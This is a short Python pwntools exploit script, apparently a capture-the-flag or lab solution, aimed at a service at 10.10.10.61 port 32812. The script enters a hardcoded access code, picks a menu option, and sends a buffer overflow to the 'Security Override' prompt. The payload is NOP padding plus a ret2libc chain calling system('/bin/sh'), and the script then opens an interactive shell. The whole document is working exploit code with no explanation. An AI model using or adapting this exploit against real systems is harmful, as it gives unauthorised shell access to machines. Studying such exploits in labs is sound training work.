# coding: utf-8
from pwn import *

# uname -a
context(os="Linux", arch="x86_64")
HOST, PORT= "10.10.10.61", 32812
r = remote(HOST, PORT)

# Padding out the buffer with NOPs
ESP_START = 0xffffcff8
EIP = 0xffffd0cc
PAD = "\x90" * (EIP - ESP_START)

SYSTEM = 0xf7e4c060
EXIT = 0xf7e3faf0
SH = 0xf7e1f65e
RET = p32(SYSTEM)
RET += p32(EXIT)
RET += p32(SH)

PAYLOAD = PAD + RET

r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(PAYLOAD)
r.interactive()
